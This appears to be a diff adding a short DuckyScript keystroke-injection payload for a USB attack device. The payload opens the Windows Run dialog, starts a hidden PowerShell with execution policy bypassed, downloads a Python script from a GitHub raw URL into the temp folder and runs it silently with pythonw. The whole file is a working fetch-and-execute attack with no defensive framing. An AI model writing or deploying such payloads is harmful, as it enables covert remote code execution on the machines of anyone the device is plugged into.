@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -ep bypass -w h -c "$url='https://raw.githubusercontent.com/EEmeka33/CyberDuck/refs/heads/main/duck.py';$out=$env:TEMP+'\cg.py';iwr $url -o $out;Start-Process pythonw $out"
+ENTER
